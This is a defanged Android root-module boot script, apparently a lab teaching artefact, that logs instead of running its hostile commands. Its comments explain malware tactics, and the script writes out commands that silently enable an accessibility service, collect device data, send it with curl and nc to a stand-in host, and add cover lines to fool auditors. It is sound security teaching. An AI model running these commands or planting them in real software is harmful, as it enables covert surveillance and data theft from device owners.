#!/system/bin/sh
#
# ============================================================================
#  LAB FIXTURE - DEFANGED - DO NOT INSTALL
#
#  Teaching artefact for chapter 62 lab 04. Every hostile command is passed to
#  would(), which prints and returns. Nothing here executes.
# ============================================================================

MODDIR=${0%/*}
LAB_LOG=/data/local/tmp/DEFANGED-fixture.log

would() {
    echo "[DEFANGED] would have run: $*" >> "$LAB_LOG"
    return 0
}

# ---------------------------------------------------------------------------
# Why the late stage is used for the rest.
#
# post-fs-data is too early for anything that needs the framework: no `am`, no
# `pm`, no `settings`, no `cmd`, no network stack. So a payload splits itself:
# the parts that must be first go in post-fs-data.sh, and the parts that need
# the system go here. Auditors who read only one script see only half.
# ---------------------------------------------------------------------------

i=0
while [ "$(getprop sys.boot_completed)" != "1" ] && [ "$i" -lt 120 ]; do
    sleep 1
    i=$((i + 1))
done

# ---------------------------------------------------------------------------
# Behaviour 8: enable an accessibility service.
#
# An enabled accessibility service can read the content of every screen and
# inject input anywhere on the device. It is the single most powerful thing an
# Android application can hold, and the OS deliberately makes it hard to enable
# by design: the user must find it in Settings and confirm a warning dialog.
# Writing the secure setting as root bypasses that entirely, and the user is
# never told.
#
# This is the line to lead a finding with.
# ---------------------------------------------------------------------------
would settings put secure enabled_accessibility_services com.optimizer.companion/.OptService
would settings put secure accessibility_enabled 1

# ---------------------------------------------------------------------------
# Behaviour 9: exfiltrate a device inventory.
#
# Identifiers, account names and the installed-package list are enough to
# fingerprint the device and its owner, and to select which follow-on payload
# is worth delivering. Note that it collects first and sends once: a single
# outbound request at boot is far less conspicuous than continuous traffic.
# ---------------------------------------------------------------------------
would sh -c "getprop > /data/local/tmp/.inv"
would sh -c "pm list packages >> /data/local/tmp/.inv"
would sh -c "logcat -d -b main -t 2000 >> /data/local/tmp/.inv"
would curl -s -X POST --data-binary @/data/local/tmp/.inv https://telemetry.optimizer-profiles.invalid/i
would nc telemetry.optimizer-profiles.invalid 4444

# ---------------------------------------------------------------------------
# Cover traffic: a handful of genuinely harmless "optimisation" lines, so that
# a skim-read finds something that matches the module's stated purpose.
# ---------------------------------------------------------------------------
would settings put global window_animation_scale 0.5
would settings put global transition_animation_scale 0.5

# ---------------------------------------------------------------------------
# Start the companion app so the payload is resident.
# ---------------------------------------------------------------------------
would am start -n com.optimizer.companion/.MainActivity
would am broadcast -a com.optimizer.companion.BOOT

echo "[DEFANGED] service.sh completed - nothing was executed" >> "$LAB_LOG"
